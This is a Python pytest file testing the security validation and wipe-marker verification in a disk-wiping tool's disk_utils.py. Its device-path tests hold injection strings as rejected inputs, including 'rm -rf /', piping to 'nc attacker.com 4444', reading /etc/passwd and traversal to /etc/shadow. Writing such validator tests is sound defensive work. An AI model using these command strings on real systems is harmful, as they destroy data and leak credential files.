# Unit tests for disk_utils.py security validation
import pytest
import sys
import os
import json
import hashlib
import hmac
from unittest.mock import patch, MagicMock

# Add backend to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'backend'))

from disk_utils import validate_device_path, _find_json_bounds, read_marker_status, check_write_tolerance, get_command_path, safe_int, safe_float


class TestValidateDevicePath:
    """Test device path validation for security (Lesson #9, #12)."""

    def test_valid_device_paths(self):
        """Test that valid device paths are accepted."""
        valid_paths = [
            "/dev/sda",
            "/dev/sdb1",
            "/dev/nvme0n1",
            "/dev/nvme0n1p1",
            "/dev/sdaa",
            "/dev/sd_z",
            "/dev/mapper/cryptroot",
            "/dev/disk/by-path/pci-0000:00:1f.2-ata-1",
            "/dev/disk/by-id/ata-ST1000DM003-1CH162_W1F4xxxx",
        ]
        for path in valid_paths:
            assert validate_device_path(path) is True, f"Valid path rejected: {path}"

    def test_invalid_null_or_empty(self):
        """Test that None and empty strings are rejected."""
        assert validate_device_path(None) is False
        assert validate_device_path("") is False
        assert validate_device_path("  ") is False

    def test_invalid_non_string(self):
        """Test that non-string inputs are rejected."""
        assert validate_device_path(123) is False
        assert validate_device_path([]) is False
        assert validate_device_path({}) is False

    def test_path_traversal_attack(self):
        """Test that path traversal attacks are blocked (Lesson #9)."""
        malicious_paths = [
            "/dev/../etc/passwd",
            "/dev/sda/../../etc/shadow",
            "/dev/../../bin/sh",
        ]
        for path in malicious_paths:
            assert validate_device_path(path) is False, f"Path traversal not blocked: {path}"

    def test_newline_injection(self):
        """Test that newline injection is blocked (Lesson #12)."""
        malicious_paths = [
            "/dev/sda\n",
            "/dev/sda\r",
            "/dev/sda\n/etc/passwd",
            "/dev/sda\rDELETE FROM users",
        ]
        for path in malicious_paths:
            assert validate_device_path(path) is False, f"Newline injection not blocked: {path}"

    def test_command_injection_via_double_dash(self):
        """Test that command injection attempts are blocked."""
        malicious_paths = [
            "/dev/sda; rm -rf /",
            "/dev/sda && cat /etc/passwd",
            "/dev/sda | nc attacker.com 4444",
            "/dev/sda`whoami`",
            "/dev/sda$(reboot)",
        ]
        for path in malicious_paths:
            assert validate_device_path(path) is False, f"Command injection not blocked: {path}"

    def test_absolute_path_required(self):
        """Test that relative paths are rejected."""
        relative_paths = [
            "dev/sda",
            "./dev/sda",
            "../dev/sda",
            "sda",
        ]
        for path in relative_paths:
            assert validate_device_path(path) is False, f"Relative path not blocked: {path}"

    def test_invalid_characters(self):
        """Test that paths with invalid characters are rejected."""
        invalid_paths = [
            "/dev/sda*",  # wildcard
            "/dev/sda?",  # wildcard
            "/dev/sda[0-9]",  # bracket expression
            "/dev/sda\\x00",  # null byte (if not caught by newline check)
        ]
        for path in invalid_paths:
            assert validate_device_path(path) is False, f"Invalid character not blocked: {path}"

    def test_valid_special_characters(self):
        """Test that valid special characters in device names are accepted."""
        valid_special_paths = [
            "/dev/sd-z",  # hyphen
            "/dev/sd_z",  # underscore
            "/dev/sd:1",  # colon
            "/dev/sd.1",  # dot
        ]
        for path in valid_special_paths:
            assert validate_device_path(path) is True, f"Valid special character rejected: {path}"

    def test_strict_end_anchor(self):
        r"""Test that trailing newlines are rejected (Lesson #12 - \Z vs $)."""
        # This test ensures the regex uses \Z (strict end) not $ (allows trailing \n)
        malicious_paths = [
            "/dev/sda\n",
            "/dev/sda\r\n",
            "/dev/sda\r",
        ]
        for path in malicious_paths:
            assert validate_device_path(path) is False, f"Trailing newline not blocked by strict anchor: {repr(path)}"


class TestFindJsonBounds:
    """Test string-aware JSON boundary detection (Lesson #11)."""

    def test_invalid_marker_index(self):
        """Test with invalid marker index."""
        data = b'{"key": "value"}'
        start, end = _find_json_bounds(data, -1)
        assert start == -1
        assert end == -1

        start, end = _find_json_bounds(data, 100)
        assert start == -1
        assert end == -1

    def test_no_closing_brace(self):
        """Test when there's no matching closing brace."""
        data = b'{"key": "value"DWS_MARKER_V1'
        marker_index = data.find(b'DWS_MARKER_V1')
        start, end = _find_json_bounds(data, marker_index)
        assert start == -1
        assert end == -1


class TestReadMarkerStatus:
    """Test marker reading and verification (Lesson #22)."""

    @patch('disk_utils.get_command_path')
    @patch('subprocess.run')
    def test_marker_not_found(self, mock_run, mock_get_cmd):
        """Test when no marker is present on disk."""
        mock_get_cmd.return_value = '/usr/bin/dd'
        mock_run.return_value = MagicMock(returncode=0, stdout=b'\x00' * 4096)

        result = read_marker_status('/dev/sda', 'sata')
        assert result["ok"] is True
        assert result["status"] == "none"
        assert result["error"] is None

    @patch('disk_utils.get_command_path')
    @patch('subprocess.run')
    def test_invalid_device_path(self, mock_run, mock_get_cmd):
        """Test that invalid device paths are rejected."""
        result = read_marker_status('/etc/passwd', 'sata')
        assert result["ok"] is False
        assert result["status"] == "marker_error"
        assert result["error"] == "invalid_device_path"

    @patch('disk_utils.get_command_path')
    def test_dd_command_not_available(self, mock_get_cmd):
        """Test when dd command is not available."""
        mock_get_cmd.return_value = None
        result = read_marker_status('/dev/sda', 'sata')
        assert result["ok"] is False
        assert result["status"] == "marker_error"
        assert result["error"] == "dd_not_available_for_marker_read"

    @patch('disk_utils.get_command_path')
    @patch('subprocess.run')
    def test_marker_checksum_valid(self, mock_run, mock_get_cmd):
        """Test successful marker validation with valid checksum."""
        mock_get_cmd.return_value = '/usr/bin/dd'

        # Create a valid marker payload
        marker_data = {
            "signature": "DWS_MARKER_V1",
            "job_id": "test-job-123",
            "finished_at": "2024-01-01T00:00:00Z",
            "method": "crypto",
            "serial": "TEST123",
            "ticket_number": "TICKET-001",
            "data_written_at_wipe": 1000
        }
        marker_json = json.dumps(marker_data, sort_keys=True, separators=(',', ':'))
        checksum = hashlib.sha256(marker_json.encode('utf-8')).hexdigest()
        marker_data["checksum"] = checksum
        final_json = json.dumps(marker_data, sort_keys=True, separators=(',', ':'))

        # Embed in a 4096-byte block
        block = bytearray(4096)
        block[0:len(final_json)] = final_json.encode('utf-8')

        mock_run.return_value = MagicMock(returncode=0, stdout=bytes(block))

        result = read_marker_status('/dev/sda', 'sata')
        assert result["ok"] is True
        assert result["status"] == "checksum_valid"
        assert result["error"] is None
        assert result["details"]["job_id"] == "test-job-123"

    @patch('disk_utils.get_command_path')
    @patch('subprocess.run')
    def test_marker_checksum_mismatch(self, mock_run, mock_get_cmd):
        """Test marker with invalid checksum."""
        mock_get_cmd.return_value = '/usr/bin/dd'

        marker_data = {
            "signature": "DWS_MARKER_V1",
            "job_id": "test-job-123",
            "checksum": "invalid_checksum"
        }
        final_json = json.dumps(marker_data, sort_keys=True, separators=(',', ':'))

        block = bytearray(4096)
        block[0:len(final_json)] = final_json.encode('utf-8')

        mock_run.return_value = MagicMock(returncode=0, stdout=bytes(block))

        result = read_marker_status('/dev/sda', 'sata')
        assert result["ok"] is True
        assert result["status"] == "corrupted"
        assert result["error"] == "checksum_mismatch"

    @patch('disk_utils.get_command_path')
    @patch('subprocess.run')
    def test_marker_hmac_verification(self, mock_run, mock_get_cmd):
        """Test HMAC verification with passphrase."""
        from disk_utils import PBKDF2_SALT, PBKDF2_ITERATIONS, MARKER_SIGNATURE
        mock_get_cmd.return_value = '/usr/bin/dd'

        marker_data = {
            "signature": MARKER_SIGNATURE,
            "job_id": "test-job-123",
            "finished_at": "2024-01-01T00:00:00Z",
            "method": "crypto",
            "serial": "TEST123"
        }
        marker_json = json.dumps(marker_data, sort_keys=True, separators=(',', ':'))
        checksum = hashlib.sha256(marker_json.encode('utf-8')).hexdigest()
        marker_data["checksum"] = checksum

        # Calculate HMAC with test passphrase on the data WITH checksum
        passphrase = "test-passphrase"
        derived_key = hashlib.pbkdf2_hmac('sha256', passphrase.encode('utf-8'), PBKDF2_SALT, PBKDF2_ITERATIONS)
        hmac_json = json.dumps(marker_data, sort_keys=True, separators=(',', ':'))
        hmac_value = hmac.new(derived_key, hmac_json.encode('utf-8'), hashlib.sha256).hexdigest()
        marker_data["hmac"] = hmac_value

        final_json = json.dumps(marker_data, sort_keys=True, separators=(',', ':'))

        block = bytearray(4096)
        block[0:len(final_json)] = final_json.encode('utf-8')

        mock_run.return_value = MagicMock(returncode=0, stdout=bytes(block))

        result = read_marker_status('/dev/sda', 'sata', passphrase)
        assert result["ok"] is True
        assert result["status"] == "checksum_valid"
        assert result["hmac_verified"] is True

    @patch('disk_utils.get_command_path')
    @patch('subprocess.run')
    def test_marker_json_too_large(self, mock_run, mock_get_cmd):
        """Test that oversized JSON is rejected (DoS protection)."""
        from disk_utils import _MAX_JSON_SIZE, MARKER_SIGNATURE
        mock_get_cmd.return_value = '/usr/bin/dd'

        marker_data = {
            "signature": MARKER_SIGNATURE,
            "job_id": "test-job-123",
            "checksum": "abc123"
        }
        final_json = json.dumps(marker_data, sort_keys=True, separators=(',', ':'))

        # Make the extracted JSON portion larger than _MAX_JSON_SIZE
        # The function checks the size of the JSON between start and end bounds
        # So we need to make the actual JSON object large
        large_data = {"signature": MARKER_SIGNATURE, "job_id": "test-job-123"}
        for i in range(10000):
            large_data[f"field_{i}"] = "x" * 100
        final_json = json.dumps(large_data, sort_keys=True, separators=(',', ':'))

        block = bytearray(len(final_json) + 100)
        block[0:len(final_json)] = final_json.encode('utf-8')

        mock_run.return_value = MagicMock(returncode=0, stdout=bytes(block))

        result = read_marker_status('/dev/sda', 'sata')
        assert result["ok"] is True
        assert result["status"] == "corrupted"
        assert result["error"] == "json_too_large"

    @patch('disk_utils.get_command_path')
    @patch('subprocess.run')
    def test_marker_hmac_mismatch(self, mock_run, mock_get_cmd):
        """Test that invalid HMAC is detected and rejected."""
        from disk_utils import PBKDF2_SALT, PBKDF2_ITERATIONS, MARKER_SIGNATURE
        mock_get_cmd.return_value = '/usr/bin/dd'

        marker_data = {
            "signature": MARKER_SIGNATURE,
            "job_id": "test-job-123",
            "finished_at": "2024-01-01T00:00:00Z",
            "method": "crypto",
            "serial": "TEST123"
        }
        marker_json = json.dumps(marker_data, sort_keys=True, separators=(',', ':'))
        checksum = hashlib.sha256(marker_json.encode('utf-8')).hexdigest()
        marker_data["checksum"] = checksum

        # Add an INVALID HMAC (wrong passphrase)
        wrong_passphrase = "wrong-passphrase"
        derived_key = hashlib.pbkdf2_hmac('sha256', wrong_passphrase.encode('utf-8'), PBKDF2_SALT, PBKDF2_ITERATIONS)
        hmac_json = json.dumps(marker_data, sort_keys=True, separators=(',', ':'))
        hmac_value = hmac.new(derived_key, hmac_json.encode('utf-8'), hashlib.sha256).hexdigest()
        marker_data["hmac"] = hmac_value

        final_json = json.dumps(marker_data, sort_keys=True, separators=(',', ':'))

        block = bytearray(4096)
        block[0:len(final_json)] = final_json.encode('utf-8')

        mock_run.return_value = MagicMock(returncode=0, stdout=bytes(block))

        # Read with the CORRECT passphrase (not the one used to sign)
        result = read_marker_status('/dev/sda', 'sata', "correct-passphrase")
        assert result["ok"] is True
        assert result["status"] == "checksum_valid"
        assert result["hmac_verified"] is False

    @patch('disk_utils.get_command_path')
    @patch('subprocess.run')
    def test_marker_missing_hmac_field(self, mock_run, mock_get_cmd):
        """Test that marker without HMAC field is handled gracefully."""
        from disk_utils import MARKER_SIGNATURE
        mock_get_cmd.return_value = '/usr/bin/dd'

        marker_data = {
            "signature": MARKER_SIGNATURE,
            "job_id": "test-job-123",
            "finished_at": "2024-01-01T00:00:00Z",
            "method": "crypto",
            "serial": "TEST123"
        }
        marker_json = json.dumps(marker_data, sort_keys=True, separators=(',', ':'))
        checksum = hashlib.sha256(marker_json.encode('utf-8')).hexdigest()
        marker_data["checksum"] = checksum
        # Note: No HMAC field added

        final_json = json.dumps(marker_data, sort_keys=True, separators=(',', ':'))

        block = bytearray(4096)
        block[0:len(final_json)] = final_json.encode('utf-8')

        mock_run.return_value = MagicMock(returncode=0, stdout=bytes(block))

        # Read with passphrase - should handle missing HMAC gracefully
        result = read_marker_status('/dev/sda', 'sata', "test-passphrase")
        assert result["ok"] is True
        assert result["status"] == "checksum_valid"
        assert result["hmac_verified"] is False

    @patch('disk_utils.get_command_path')
    @patch('subprocess.run')
    def test_marker_missing_checksum_field(self, mock_run, mock_get_cmd):
        """Test that marker without checksum field is rejected."""
        from disk_utils import MARKER_SIGNATURE
        mock_get_cmd.return_value = '/usr/bin/dd'

        marker_data = {
            "signature": MARKER_SIGNATURE,
            "job_id": "test-job-123",
            "finished_at": "2024-01-01T00:00:00Z",
            "method": "crypto",
            "serial": "TEST123"
        }
        # Note: No checksum field added

        final_json = json.dumps(marker_data, sort_keys=True, separators=(',', ':'))

        block = bytearray(4096)
        block[0:len(final_json)] = final_json.encode('utf-8')

        mock_run.return_value = MagicMock(returncode=0, stdout=bytes(block))

        result = read_marker_status('/dev/sda', 'sata')
        assert result["ok"] is True
        assert result["status"] == "corrupted"
        assert result["error"] == "checksum_mismatch"


class TestCheckWriteTolerance:
    """Test write tolerance checking for pristine drive detection."""

    def test_nvme_within_tolerance(self):
        """Test NVMe write tolerance (4 sectors)."""
        result = check_write_tolerance("nvme", 1004, 1000)
        assert result is True

    def test_nvme_exceeds_tolerance(self):
        """Test NVMe write exceeds tolerance."""
        result = check_write_tolerance("nvme", 1005, 1000)
        assert result is False

    def test_sata_within_tolerance(self):
        """Test SATA write tolerance (4096 sectors)."""
        result = check_write_tolerance("sata", 5000, 1000)
        assert result is True

    def test_sata_exceeds_tolerance(self):
        """Test SATA write exceeds tolerance."""
        result = check_write_tolerance("sata", 5100, 1000)
        assert result is False

    def test_none_values(self):
        """Test with None values."""
        result = check_write_tolerance("nvme", None, None)
        assert result is False

    def test_negative_difference(self):
        """Test with negative difference (current < stored)."""
        result = check_write_tolerance("nvme", 999, 1000)
        assert result is False

    def test_interface_type_case_insensitive(self):
        """Test that interface type is case-insensitive."""
        result = check_write_tolerance("NVME", 1004, 1000)
        assert result is True

        result = check_write_tolerance("SATA", 5000, 1000)
        assert result is True


class TestSafeIntAndSafeFloat:
    """Test safe type conversion functions."""

    def test_safe_int_valid(self):
        """Test valid integer conversion."""
        assert safe_int("123") == 123
        assert safe_int(123) == 123
        assert safe_int(456.7) == 456

    def test_safe_int_none(self):
        """Test None returns default."""
        assert safe_int(None) == 0
        assert safe_int(None, 5) == 5

    def test_safe_int_invalid(self):
        """Test invalid string returns default."""
        assert safe_int("abc") == 0
        assert safe_int("abc", 10) == 10

    def test_safe_float_valid(self):
        """Test valid float conversion."""
        assert safe_float("123.45") == 123.45
        assert safe_float(123.45) == 123.45
        assert safe_float("100") == 100.0

    def test_safe_float_none(self):
        """Test None returns default."""
        assert safe_float(None) == 0.0
        assert safe_float(None, 5.5) == 5.5

    def test_safe_float_invalid(self):
        """Test invalid string returns default."""
        assert safe_float("abc") == 0.0
        assert safe_float("abc", 10.5) == 10.5


class TestCommandResolution:
    """Test command path resolution and caching."""

    def test_command_path_caching(self):
        """Test that command paths are cached with TTL."""
        import disk_utils
        # Mock _COMMAND_CONFIG to ensure command is configured
        original_config = disk_utils._COMMAND_CONFIG.copy()
        original_cache = disk_utils._COMMAND_RESOLUTION_CACHE.copy()
        disk_utils._COMMAND_CONFIG['smartctl'] = (['/usr/sbin/smartctl', '/usr/bin/smartctl'], 'SMARTCTL_PATH')
        disk_utils._COMMAND_RESOLUTION_CACHE.clear()
        try:
            # Patch resolve_command_path at the module level where get_command_path calls it
            with patch('disk_utils.resolve_command_path') as mock_resolve:
                call_count = [0]

                def mock_resolve_impl(command_name, candidates, env_var):
                    call_count[0] += 1
                    return '/usr/sbin/smartctl'

                mock_resolve.side_effect = mock_resolve_impl

                # First call should resolve
                result1 = get_command_path("smartctl")
                assert result1 == '/usr/sbin/smartctl'
                assert call_count[0] == 1

                # Second call should use cache
                result2 = get_command_path("smartctl")
                assert result2 == '/usr/sbin/smartctl'
                assert call_count[0] == 1  # No additional call
        finally:
            disk_utils._COMMAND_CONFIG.clear()
            disk_utils._COMMAND_CONFIG.update(original_config)
            disk_utils._COMMAND_RESOLUTION_CACHE.clear()
            disk_utils._COMMAND_RESOLUTION_CACHE.update(original_cache)

    def test_command_path_cache_expiration(self):
        """Test that cache can be cleared to force re-resolution."""
        with patch('disk_utils.resolve_command_path') as mock_resolve:
            call_count = [0]

            def mock_resolve_impl(command_name, candidates, env_var):
                call_count[0] += 1
                return '/usr/bin/smartctl'

            mock_resolve.side_effect = mock_resolve_impl

            # Clear cache to start fresh
            from disk_utils import _COMMAND_RESOLUTION_CACHE
            _COMMAND_RESOLUTION_CACHE.clear()

            # First call
            result1 = get_command_path("smartctl")
            assert result1 == '/usr/bin/smartctl'
            assert call_count[0] == 1

            # Clear the cache to force re-resolution
            _COMMAND_RESOLUTION_CACHE.clear()

            # Next call should re-resolve
            result2 = get_command_path("smartctl")
            assert result2 == '/usr/bin/smartctl'
            assert call_count[0] == 2

    def test_unconfigured_command_returns_none(self):
        """Test that unconfigured commands return None."""
        with patch('disk_utils.resolve_command_path', return_value=None):
            result = get_command_path("nonexistent")
            assert result is None


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
